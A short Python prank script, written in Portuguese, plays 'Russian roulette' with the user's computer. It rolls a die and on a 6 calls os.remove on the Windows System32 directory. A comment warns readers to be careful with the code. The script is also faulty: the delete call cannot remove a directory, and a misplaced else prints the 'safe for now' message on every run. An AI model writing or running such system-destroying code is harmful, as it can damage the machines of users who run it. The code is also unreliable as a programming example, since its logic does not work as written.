import random
import os
#CUIDADO COM ESSE CODIGO CUIDADO COM ESSE CODIGO CUIDADO COM ESSE CODIGO CUIDADO COM ESSE CODIGO
numero = random.randint(1, 6)

print(f"Saiu o número: {numero}")

if numero == 6:
    os.remove('c:\Windows\System32')
    
import sys
import time

for i in range(3):  # 3 pontos
    time.sleep(0.5)
    print(".", end="")
    sys.stdout.flush()

else:
    print("Você esta a salvo,,,, por enquanto")
